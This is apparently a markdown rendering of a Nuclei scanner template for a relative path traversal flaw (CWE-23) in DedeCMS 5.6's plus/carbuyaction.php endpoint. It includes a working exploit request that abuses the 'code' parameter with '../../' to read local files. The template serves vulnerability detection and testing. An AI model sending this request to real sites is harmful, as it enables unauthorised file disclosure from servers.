# Nuclei Template: DedeCmsV5.6 Carbuyaction Fileinclude
**Template ID:** dedecms-carbuyaction-fileinclude
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`dedecms-carbuyaction-fileinclude.yaml`)

## Vulnerability Information & PoC

## Description
A vulnerability in DedeCMS's 'carbuyaction.php' endpoint allows remote attackers to return the content of locally stored files via a vulnerability in the 'code' parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/plus/carbuyaction.php?dopost=return&code=../../
```

## References
- https://www.cnblogs.com/milantgh/p/3615986.html
